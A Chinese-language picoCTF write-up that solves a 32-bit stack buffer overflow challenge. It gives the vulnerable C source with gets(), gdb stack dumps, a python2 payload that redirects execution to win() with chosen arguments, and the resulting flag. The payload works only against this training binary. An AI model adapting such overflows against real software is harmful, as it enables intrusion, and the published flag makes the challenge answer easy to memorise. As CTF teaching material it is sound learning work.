## Source code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Pwn
和前一題差不多，一樣是透過 `vuln()` 裏面的 `gets()` 造成 buffer overflow，改寫 vuln() 的 return address。

但這次跳到 `win(int, int)` 之後，題目多了兩道檢查，就是 arg1 必須是 0xdeadbeef、arg2 必須是 0xdeadc0de

先讓程式執行到 `win(int, int)`，然後看看其 return address 和 function arguments 在何處。
```
(gdb) x $ebp+4
0xffffc5b0:     0x00000000

(gdb) x/100x $ebp-0x80
0xffffc52c:     0x1e67e000      0xffffc564      0xf7ffdacc      0xf7e2c549
0xffffc53c:     0x41414141      0x41414141      0x08048752      0x08048750
0xffffc54c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc55c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc56c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc57c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc58c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc59c:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc5ac:     0x41414141      0x00000000      0xffffc674      0xffffc67c
                             ^ win() ret_addr     ^ arg1          ^ arg2
```

接下來把 breakpoint 設在 `vuln()`，重跑一次程式。

**所以 win()'s return address 就緊跟在 vuln()'s return address 之後，接下來就是 arg1, arg2。**
```
(gdb) x/100x $ebp-0x100
0xffffc4a8:     0x080482e2      0xd2bb4300      0xffffc4e4      0xf7ffdacc
0xffffc4b8:     0xf7db1020      0xf7e1de32      0xf7f965c0      0xffffc53d
0xffffc4c8:     0x7fffffff      0x0000000a      0x00000000      0x080482b0
0xffffc4d8:     0xf7f96dc7      0x00000001      0xf7f96d80      0xf7db7784
0xffffc4e8:     0xffffc598      0xffffc53c      0xf7f96d80      0x00000000
0xffffc4f8:     0xf7f96000      0xd2bb4300      0xffffc5a8      0xf7fe9540
0xffffc508:     0xf7f97890      0x00000000      0xf7f96000      0xf7f96000
0xffffc518:     0xffffc5a8      0x08048658      0xffffc53c      0xf7fe39ba
0xffffc528:     0x080482d5      0xd2bb4300      0xffffc564      0xf7ffdacc
0xffffc538:     0xf7e2c549      0x41414141      0x41414141      0x41414141
0xffffc548:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc558:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc568:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc578:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc588:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc598:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc5a8:     0x41414141      0x080485cb      0x00000000      0xffffc674
                            ^ vuln() ret_addr  ^ win() ret_addr   ^ arg1
0xffffc5b8:     0xffffc67c      0x000003e8      0x00000000      0xffffc5e0
```

寫 payload
```
$ python2 -c 'print 28 * 4 * "A" + "\xcb\x85\x04\x08" + 4 * "\x00" + "\xef\xbe\xad\xde\xde\xc0\xad\xde"' | ./vuln
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅
picoCTF{addr3ss3s_ar3_3asy30833fa1}
```

flag: `picoCTF{addr3ss3s_ar3_3asy30833fa1}`
